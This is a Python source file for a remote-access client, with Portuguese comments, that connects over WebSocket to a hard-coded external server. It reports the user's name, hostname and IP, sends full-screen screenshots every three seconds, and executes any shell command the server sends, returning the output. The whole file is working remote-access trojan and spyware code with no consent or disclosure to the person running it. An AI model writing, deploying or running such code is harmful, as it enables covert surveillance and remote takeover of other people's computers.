import websocket
import json
import subprocess
import threading
import base64
import io
import time
import socket
import os
from PIL import Image
import mss
import getpass

SERVER_URL = "wss://hihat-project.onrender.com"

def get_client_id():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        username = getpass.getuser()
        return f"{username}@{hostname} ({ip_address})"
    except:
        return f"unknown@{socket.gethostname()}"

CLIENT_ID = get_client_id()

def capture_screen(interval, wss):
    with mss.mss() as sct:
        while True:
            try:
                screenshot = sct.grab(sct.monitors[0])
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                img = img.resize((1900, 1000))  # Reduz a resolução
                buffer = io.BytesIO()
                img.save(buffer, format="JPEG", quality=50)  # Compressão
                encoded = base64.b64encode(buffer.getvalue()).decode("utf-8")

                wss.send(json.dumps({
                    "type": "screen",
                    "id": CLIENT_ID,
                    "image": encoded
                }))
            except Exception as e:
                print("[screen error]", e)
            time.sleep(interval)

def on_message(wss, message):
    try:
        data = json.loads(message)
        if data.get("command"):
            command = data["command"]
            print(f"[+] Comando recebido: {command}")
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                output = result.decode(errors="ignore")
            except subprocess.CalledProcessError as e:
                output = e.output.decode(errors="ignore")
            wss.send(json.dumps({
                "type": "result",
                "id": CLIENT_ID,
                "output": output
            }))
    except Exception as e:
        print("Erro ao processar comando:", e)

def on_error(wss, error):
    print("Erro:", error)

def on_close(wss, close_status_code, close_msg):
    print("Conexão encerrada")

def on_open(wss):
    print("Conectado ao servidor WebSocket")
    wss.send(json.dumps({"type": "id", "id": CLIENT_ID, "role": "client",}))
    threading.Thread(target=capture_screen, args=(3, wss), daemon=True).start()

def main():
    websocket.enableTrace(False)
    wss = websocket.WebSocketApp(SERVER_URL,
                                on_open=on_open,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close)
    wss.run_forever()

if __name__ == "__main__":
    main()
